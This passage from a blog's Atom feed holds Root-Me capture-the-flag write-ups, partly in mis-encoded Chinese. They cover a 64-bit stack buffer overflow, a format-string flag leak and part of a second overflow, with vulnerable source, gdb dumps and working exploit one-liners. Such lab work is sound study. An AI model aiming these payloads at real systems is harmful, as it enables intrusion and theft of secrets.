href="https://blog.csdn.net/qq_21997625/article/details/84672775">https://blog.csdn.net/qq_21997625/article/details/84672775</a></p><p><code>mymap.insert(make_pair(nums[i],i));</code><br>å°æŠ€å·§</p><h4 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h4><p><a href="https://github.com/Finsenty54/my_leetcode_cplusplus/blob/main/two_num_hash_map.cpp">https://github.com/Finsenty54/my_leetcode_cplusplus/blob/main/two_num_hash_map.cpp</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;leetcode 1 two sum&lt;/p&gt;
&lt;h3 id=&quot;å­¦åˆ°çš„ä¸œè¥¿&quot;&gt;&lt;a href=&quot;#å­¦åˆ°çš„ä¸œè¥¿&quot; class=&quot;headerlink&quot; title=&quot;å­¦åˆ°çš„ä¸œè¥¿&quot;&gt;&lt;/a&gt;å­¦åˆ°çš„ä¸œè¥¿&lt;/h3&gt;&lt;h4 id=&quot;hash-table-å“ˆå¸Œè¡¨&quot;&gt;&lt;a href=&quot;#hash-table-å“ˆå¸Œè¡¨&quot; class=&quot;headerlink&quot; title=&quot;hash-table å“ˆå¸Œè¡¨&quot;&gt;&lt;/a&gt;hash-table å“ˆå¸Œè¡¨&lt;/h4&gt;&lt;p&gt;æ•£åˆ—è¡¨&lt;br&gt;æ˜¯æ ¹æ®é”®ï¼ˆKeyï¼‰è€Œç›´æ¥è®¿é—®åœ¨å†…å­˜å‚¨å­˜ä½ç½®çš„æ•°æ®ç»“æ„&lt;/p&gt;
&lt;p&gt;è‹¥å…³é”®å­—ä¸ºkï¼Œåˆ™å…¶å€¼å­˜æ”¾åœ¨f(k)çš„å­˜å‚¨ä½ç½®ä¸Šã€‚ç”±æ­¤ï¼Œä¸éœ€æ¯”è¾ƒä¾¿å¯ç›´æ¥å–å¾—æ‰€æŸ¥è®°å½•ã€‚ç§°è¿™ä¸ªå¯¹åº”å…³ç³»fä¸ºæ•£åˆ—å‡½æ•°ï¼ŒæŒ‰è¿™ä¸ªæ€æƒ³å»ºç«‹çš„è¡¨ä¸ºæ•£åˆ—è¡¨ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="leetcode" scheme="http://finsenty54.github.io/categories/leetcode/"/>
    
    
    <category term="C++" scheme="http://finsenty54.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Stack buffer overflow - basic</title>
    <link href="http://finsenty54.github.io/2020/11/24/Stack-buffer-overflow-basic/"/>
    <id>http://finsenty54.github.io/2020/11/24/Stack-buffer-overflow-basic/</id>
    <published>2020-11-24T13:29:57.000Z</published>
    <updated>2020-11-24T13:31:11.316Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x64-Stack-buffer-overflow-basic"><a href="#ELF-x64-Stack-buffer-overflow-basic" class="headerlink" title="ELF x64 - Stack buffer overflow - basic"></a>ELF x64 - Stack buffer overflow - basic</h2><p><em>gdb å†… æŸ¥çœ‹å‡½æ•°</em></p><p><code>info functions</code></p><pre><code>0x0000000000401152  callMeMaybe0x0000000000401193  main</code></pre><a id="more"></a><hr><p>ret å<br>ä¼šå°†rspæŒ‡å‘çš„å†…å®¹å‹å…¥RIPï¼Œè½¬ç§»ç¨‹åºæ‰§è¡Œæµ</p><hr><p>é¢˜ç›®æºä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gcc -o ch35 ch35.c -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callMeMaybe</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[] = &#123; <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-p&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">int</span> len, i;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">    len = <span class="built_in">strlen</span>(buffer);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, buffer);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="ä¸»è¦æ€è·¯ï¼š"><a href="#ä¸»è¦æ€è·¯ï¼š" class="headerlink" title="ä¸»è¦æ€è·¯ï¼š"></a>ä¸»è¦æ€è·¯ï¼š</h3><p><a href="http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf">http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf</a><br>æ ¹æ®è¿™ç¯‡æ–‡ç« <br>é€šè¿‡æº¢å‡ºæ¥æ§åˆ¶RIPï¼Œå°†å…¶æŒ‡å‘æˆ‘ä»¬æƒ³è¦çš„å‡½æ•°</p><ol><li>å…ˆå‘bufferä¸­è¾“å…¥å­—ç¬¦ï¼Œæ‰§è¡Œåˆ°<code>ret</code>æ—¶ï¼ŒæŸ¥çœ‹<code>RSP</code>çš„å€¼ï¼Œç¡®å®šéœ€è¦å¤šå°‘ä½å¯ä»¥æº¢å‡ºåˆ°<code>RSP</code>ä½</li><li>å¯ä»¥ç¡®å®šéœ€è¦<code>0x110</code> å³<code>280</code>ä½ï¼Œä¹‹åæ·»åŠ çš„å­—ç¬¦å°±ä¼šè¾“å…¥è¿›<code>RIP</code>ä¸­</li><li>æˆ‘ä»¬éœ€è¦çš„æ˜¯æ‰§è¡Œ<code>callMeMaybe()</code>ï¼Œæ‰€ä»¥å°†å‡½æ•°åœ°å€å€’åºæ·»åŠ è¿›æœ«å°¾ï¼ˆå› ä¸ºå°ç«¯åºï¼‰</li></ol><hr><h3 id="æŸ¥çœ‹å‡½æ•°åœ°å€"><a href="#æŸ¥çœ‹å‡½æ•°åœ°å€" class="headerlink" title="æŸ¥çœ‹å‡½æ•°åœ°å€"></a>æŸ¥çœ‹å‡½æ•°åœ°å€</h3><pre><code>[0x00401193]&gt; fs symbols;f0x00401000 23 sym._init0x00401070 42 entry00x00401070 43 sym._start0x004010a0 1 sym._dl_relocate_static_pie0x004010b0 33 sym.deregister_tm_clones0x004010e0 49 sym.register_tm_clones0x00401120 33 entry.fini00x00401120 0 sym.__do_global_dtors_aux0x00401150 2 entry.init00x00401150 0 sym.frame_dummy0x00401152 65 sym.callMeMaybe0x00401193 103 main0x00401193 103 sym.main</code></pre><h3 id="â€œaâ€-280-â€Bâ€-6"><a href="#â€œaâ€-280-â€Bâ€-6" class="headerlink" title="â€œaâ€*280+â€Bâ€*6"></a>â€œaâ€*280+â€Bâ€*6</h3><pre><code>gdb-peda$ x/290xb $rbp-0x1100x7fffffffdb80:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdb88:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdb90:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdb98:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdba0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdba8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbb0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbb8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbc0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbc8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbd0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbd8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbe0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbe8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbf0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbf8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc00:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc08:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc10:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc18:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc20:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc28:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc30:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc38:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc40:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc48:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc50:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc58:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc60:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc68:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc70:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc78:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc80:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc88:    0x61    0x61    0x61    0x61    0x1e    0x01    0x00    0x000x7fffffffdc90:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc98:    0x42    0x42    0x42    0x42    0x42    0x42    0x00    0x000x7fffffffdca0:    0x88    0xdd</code></pre><hr><p>æˆåŠŸæ§åˆ¶RIP<br>RSP: 0x7fffffffdc98 â€“&gt; 0x424242424242 (â€˜BBBBBBâ€™)<br>Invalid $PC address: 0x424242424242</p><p>æœ€åçš„payload:<br><code>(python -c &#39;print &quot;A&quot; * 280  + &quot;\xe7\x05\x40\x00\x00\x00\x00\x00&quot;&#39; ; cat ) | ./ch35</code></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x64-Stack-buffer-overflow-basic&quot;&gt;&lt;a href=&quot;#ELF-x64-Stack-buffer-overflow-basic&quot; class=&quot;headerlink&quot; title=&quot;ELF x64 - Stack buffer overflow - basic&quot;&gt;&lt;/a&gt;ELF x64 - Stack buffer overflow - basic&lt;/h2&gt;&lt;p&gt;&lt;em&gt;gdb å†… æŸ¥çœ‹å‡½æ•°&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;info functions&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x0000000000401152  callMeMaybe
0x0000000000401193  main&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Format string bug basic 1</title>
    <link href="http://finsenty54.github.io/2020/11/17/Format_string_bug_basic%201/"/>
    <id>http://finsenty54.github.io/2020/11/17/Format_string_bug_basic%201/</id>
    <published>2020-11-17T08:00:33.000Z</published>
    <updated>2020-11-17T08:01:53.892Z</updated>
    
    <content type="html"><![CDATA[<p>Z3::  big è¡¨ç¤ºå¤§ç«¯åº å³æœ«å°¾æ”¾åœ¨é«˜åœ°å€å¤„ å³é¡ºåºä¿æŒä¸å˜<br>åœ°å€ï¼š0x804810: â€“ : 0x804820</p><h2 id="Exploit-writing-tutorial-part-1-Stack-Based-Overflows"><a href="#Exploit-writing-tutorial-part-1-Stack-Based-Overflows" class="headerlink" title="Exploit writing tutorial part 1 : Stack Based Overflows"></a><a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" title="Exploit writing tutorial part 1 : Stack Based Overflows">Exploit writing tutorial part 1 : Stack Based Overflows</a></h2><p><code>ax</code> 16ä½<br><code>al</code> 8ä½</p><pre><code>mov     rax, [rbp+var_E0] ï¼›rax=0xc8    0xdf    0xff    0xff    0xff    0x7fmov     rax, [rax] ; rax=0x7fffffffe2f4mov     [rbp+input], rax ;mov     rax, [rbp+input] ; rax=0x7fffffffe2f4mov     rdi, rax        ; scall    _strlen</code></pre><a id="more"></a><h3 id="å¯»æ‰¾ç¡®å®šä½ç½®"><a href="#å¯»æ‰¾ç¡®å®šä½ç½®" class="headerlink" title="å¯»æ‰¾ç¡®å®šä½ç½®"></a>å¯»æ‰¾ç¡®å®šä½ç½®</h3><p><code>msf-pattern_create -l 5000</code><br>At this time, eip contains <code>0x356b4234</code> (note : little endian : we have overwritten EIP with 34 42 6b 35 = <code>4Bk5</code></p><p><code>msf-pattern_offset 0x356b4234 5000</code><br>è®¡ç®—pattern åç§»å€¼</p><p><code>1094</code>. Thatâ€™s the <code>buffer length needed</code> to overwrite EIP. So if you create a file with <code>25000+1094 Aâ€™s</code>, and then add <code>4 Bâ€™s (42 42 42 42 in hex)</code><br><code>EIP</code> should contain <code>42 42 42 42</code>.</p><hr><h3 id="æ¸…ç†å‡½æ•°"><a href="#æ¸…ç†å‡½æ•°" class="headerlink" title="æ¸…ç†å‡½æ•°"></a>æ¸…ç†å‡½æ•°</h3><p>POP å‡ºä¸‹ä¸€è·³åœ°å€åï¼Œ ESP ä¸æ˜¯æŒ‡å‘<code>â€ä¸‹ä¸€ä¸ªæ ˆåœ°å€â€œ</code><br>Â·ESPä»æ¨¡å¼çš„ç¬¬5ä¸ªå­—ç¬¦å¼€å§‹ï¼Œè€Œä¸æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚<br>Â·ï¼ˆç”±äºè°ƒç”¨çº¦å®šï¼Œå½“å°†å‚æ•°ä¼ é€’ç»™å­å‡½æ•°æ—¶ï¼Œ<code>å­å‡½æ•°å°†æ¸…ç†çˆ¶å‡½æ•°ä½¿ç”¨çš„å †æ ˆç©ºé—´</code>ï¼Œæ‰€ä»¥é€ æˆESPä¸æ˜¯æŒ‡å‘ä¸‹ä¸€ä¸ªæ ˆåœ°å€ï¼‰</p><hr><h3 id="è·³è½¬"><a href="#è·³è½¬" class="headerlink" title="è·³è½¬"></a>è·³è½¬</h3><p>å°†EIP å†™ä¸ºæŒ‡å‘jmp espçš„åœ°å€ï¼Œshellcodeå†™åœ¨espæŒ‡å‘çš„åœ°å€å¤„</p><p>windbg::<br>s 01b10000 l 01fdd000 ff e4<br>search åœ¨è¿™ä¹‹é—´å¯»æ‰¾æœºå™¨ç ä¸º <code>ff e4</code> çš„æŒ‡ä»¤</p><hr><h3 id="NULL-å­—èŠ‚"><a href="#NULL-å­—èŠ‚" class="headerlink" title="NULL å­—èŠ‚"></a>NULL å­—èŠ‚</h3><p>The <code>null byte</code> would become <code>a string terminator</code> and the<code> rest of the buffer data</code> will become <code>unusable</code>)</p><p>Alternatively, you can split up your shellcode in smaller â€˜eggsâ€™ and use a technique called â€˜egg-huntingâ€™ to reassemble the shellcode before executing it.</p><h2 id="ELF-x86-Format-string-bug-basic-1"><a href="#ELF-x86-Format-string-bug-basic-1" class="headerlink" title="ELF x86 - Format string bug basic 1"></a>ELF x86 - Format string bug basic 1</h2><p><a href="http://showlinkroom.me/2017/01/28/pwn-learn-printf/">http://showlinkroom.me/2017/01/28/pwn-learn-printf/</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">|   ç¬¦å·           |       ä½œç”¨               |</span><br><span class="line"><span class="selector-tag">-----------------------------------------------</span></span><br><span class="line">|    %d            |  åè¿›åˆ¶æœ‰ç¬¦å·æ•´æ•°         |</span><br><span class="line">|    %u            |  åè¿›åˆ¶æ— ç¬¦å·æ•´æ•°         |</span><br><span class="line">|    %f            |  æµ®ç‚¹æ•°                  |</span><br><span class="line">|    %s            |  å­—ç¬¦ä¸²                  |</span><br><span class="line">|    %c            |  å•ä¸ªå­—ç¬¦                |</span><br><span class="line">|    %p            |  æŒ‡é’ˆçš„å€¼                |</span><br><span class="line">|    %e            |  æŒ‡æ•°å½¢å¼çš„æµ®ç‚¹æ•°         |</span><br><span class="line">|    %x            |  æ— ç¬¦å·ä»¥åå…­è¿›åˆ¶è¡¨ç¤ºçš„æ•´æ•°|</span><br><span class="line">|    %o            |  æ— ç¬¦å·ä»¥å…«è¿›åˆ¶è¡¨ç¤ºçš„æ•´æ•°  |</span><br><span class="line">|    %g            |  è‡ªåŠ¨é€‰æ‹©åˆé€‚çš„è¡¨ç¤ºæ³•     |  </span><br><span class="line">|    %n            |  å°†printfä¹‹å‰å·²ç»è¾“å‡ºçš„å­—ç¬¦ä¸²ä¸ªæ•°èµ‹ç»™æŒ‡å®šå‚æ•°ï¼ˆæ­¤æ—¶å‚æ•°æä¾›åœ°å€ï¼‰|</span><br></pre></td></tr></table></figure><hr><p>é¢˜ç›®æºç </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">        FILE *secret = fopen(<span class="string">&quot;/challenge/app-systeme/ch5/.passwd&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">        <span class="keyword">char</span> buffer[<span class="number">32</span>];</span><br><span class="line">        fgets(buffer, <span class="keyword">sizeof</span>(buffer), secret);</span><br><span class="line">        <span class="built_in">printf</span>(argv[<span class="number">1</span>]);</span><br><span class="line">        fclose(secret);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><code>printf (&quot;%s%s%s%s%s%s%s%s%s%s%s%s&quot;);</code></p><p>Because <code>â€˜%sâ€™</code> displays memory from an address that is supplied on the stack, where a lot of other data is stored, too, our chances are high to readfrom anillegal address, which is not mapped.</p><pre><code>printf (&quot;Number %d has no address, number %d has: %08x\n&quot;, i, a, &amp;a);stack top. . .&lt;&amp;a&gt;&lt;a&gt;&lt;i&gt;A. . .stack bottom</code></pre><p><a href="https://imgchr.com/i/DVLAYV"><img src="https://s3.ax1x.com/2020/11/17/DVLAYV.png" alt="DVLAYV.png"></a></p><p>å¯ä»¥ç›´æ¥è¯»æ ˆé‡Œçš„å†…å®¹</p><hr><h3 id="æŸ¥çœ‹æ ˆé‡Œçš„å†…å®¹"><a href="#æŸ¥çœ‹æ ˆé‡Œçš„å†…å®¹" class="headerlink" title="æŸ¥çœ‹æ ˆé‡Œçš„å†…å®¹"></a>æŸ¥çœ‹æ ˆé‡Œçš„å†…å®¹</h3><p><code>printf (&quot;%08x.%08x.%08x.%08x.%08x\n&quot;);</code><br>This works, because we instruct the <code>printf-</code>function to retrieve <code>five parameters</code> from the stack and display them as 8-digit padded hexadecimalnumbers. So a possible output may look like:<code>40012980.080628c4.bffff7a4.00000005.08059c04</code></p><h3 id="æŸ¥çœ‹ä»»æ„åœ°å€å†…å®¹"><a href="#æŸ¥çœ‹ä»»æ„åœ°å€å†…å®¹" class="headerlink" title="æŸ¥çœ‹ä»»æ„åœ°å€å†…å®¹"></a>æŸ¥çœ‹ä»»æ„åœ°å€å†…å®¹</h3><p>%s  string ((const) (unsigned) char *) reference<br>â€˜ï¼…sâ€™å‚æ•°æ°å¥½åšåˆ°äº†ï¼Œå®ƒæ˜¾ç¤ºäº†å †æ ˆæä¾›çš„åœ°å€ä¸­çš„å†…å­˜ã€‚</p><p><a href="https://imgchr.com/i/DVLc6g"><img src="https://s3.ax1x.com/2020/11/17/DVLc6g.png" alt="DVLc6g.png"></a></p><hr><p>å½“æˆ‘åœ¨GDBä¸­æ‰§è¡Œfgets()çš„æ—¶å€™ã€‚<br>but if we try to debug the programm with GDB, we get a <code>permission denied</code> on the <code>fgets() call</code>â€¦</p><pre><code>gdb-peda$ help telescope Display memory content at an address with smart dereferencesUsage:    telescope [linecount] (analyze at current $SP)    telescope address [linecount]</code></pre><hr><h3 id="å¤§ä½¬çš„æ–¹æ³•"><a href="#å¤§ä½¬çš„æ–¹æ³•" class="headerlink" title="å¤§ä½¬çš„æ–¹æ³•"></a>å¤§ä½¬çš„æ–¹æ³•</h3><pre><code>for i in `seq 1 20`; do ~/ch5 &quot;%$i&quot;&#39;$08X&#39; ; echo; done</code></pre><p>ä¸€æ¬¡æ‰“å°8ä¸ªå­—èŠ‚</p><pre><code>for i in `seq 1 2 20`; do ./ch5 &quot;%$i&quot;&#39;$08X&#39;&quot;%$((i+1))&quot;&#39;$08X&#39;; echo; done</code></pre><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Finally, we want to</span><br><span class="line">- convert to big endian, <span class="keyword">using</span> sed -r â€™s/(..)(..)(..)(..)/\<span class="number">4</span>\<span class="number">3</span>\<span class="number">2</span>\<span class="number">1</span>/gâ€™</span><br><span class="line">- convert the hexa to printable character, <span class="keyword">using</span> xxd -r -p</span><br><span class="line">- filter non-printable charaters, <span class="keyword">using</span> strings</span><br></pre></td></tr></table></figure><p>filtering only <code>13-or-more-bytes</code> strings (<code>strings -13</code>)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">strings <span class="number">-13</span> &lt; &lt;(<span class="keyword">for</span> i in `seq <span class="number">1</span> <span class="number">20</span>`; \</span><br><span class="line">    do ~/ch5 &quot;%$i&quot;&#x27;$08X&#x27;&quot;%$((i+1))&quot;&#x27;$08X&#x27;&quot;%$((i+2))&quot;&#x27;$08X&#x27;&quot;%$((i+3))&quot;&#x27;$08X&#x27; \</span><br><span class="line">    |sed -r &#x27;s/(..)(..)(..)(..)/\4\3\2\1/g&#x27; \</span><br><span class="line">    |xxd -r -p; echo;  done)</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šï¼š</p><pre><code>â”Œâ”€[zentreisender@parrotos]â”€[~/Documents]â””â”€â”€â•¼ $strings -hUsage: strings [option(s)] [file(s)] Display printable strings in [file(s)] (stdin by default)</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;Z3::  big è¡¨ç¤ºå¤§ç«¯åº å³æœ«å°¾æ”¾åœ¨é«˜åœ°å€å¤„ å³é¡ºåºä¿æŒä¸å˜&lt;br&gt;åœ°å€ï¼š0x804810: â€“ : 0x804820&lt;/p&gt;
&lt;h2 id=&quot;Exploit-writing-tutorial-part-1-Stack-Based-Overflows&quot;&gt;&lt;a href=&quot;#Exploit-writing-tutorial-part-1-Stack-Based-Overflows&quot; class=&quot;headerlink&quot; title=&quot;Exploit writing tutorial part 1 : Stack Based Overflows&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/&quot; title=&quot;Exploit writing tutorial part 1 : Stack Based Overflows&quot;&gt;Exploit writing tutorial part 1 : Stack Based Overflows&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;code&gt;ax&lt;/code&gt; 16ä½&lt;br&gt;&lt;code&gt;al&lt;/code&gt; 8ä½&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mov     rax, [rbp+var_E0] ï¼›rax=0xc8    0xdf    0xff    0xff    0xff    0x7f
mov     rax, [rax] ; rax=0x7fffffffe2f4
mov     [rbp+input], rax ;
mov     rax, [rbp+input] ; rax=0x7fffffffe2f4
mov     rdi, rax        ; s
call    _strlen&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Stack buffer overflow basic 2</title>
    <link href="http://finsenty54.github.io/2020/11/14/Stack_buffer_overflow_basic_2/"/>
    <id>http://finsenty54.github.io/2020/11/14/Stack_buffer_overflow_basic_2/</id>
    <published>2020-11-14T03:08:34.000Z</published>
    <updated>2020-11-14T03:13:29.741Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x86-Stack-buffer-overflow-basic-2"><a href="#ELF-x86-Stack-buffer-overflow-basic-2" class="headerlink" title="ELF x86 - Stack buffer overflow basic 2"></a>ELF x86 - Stack buffer overflow basic 2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setreuid(geteuid(), geteuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hey dude ! Waaaaazzaaaaaaaa ?!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> var;</span><br><span class="line">    <span class="keyword">void</span> (*func)()=sup;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    fgets(buf,<span class="number">133</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a> <h3 id="åæ±‡ç¼–ä»£ç "><a href="#åæ±‡ç¼–ä»£ç " class="headerlink" title="åæ±‡ç¼–ä»£ç "></a>åæ±‡ç¼–ä»£ç </h3><p><a href="https://imgchr.com/i/DCSycj"><img 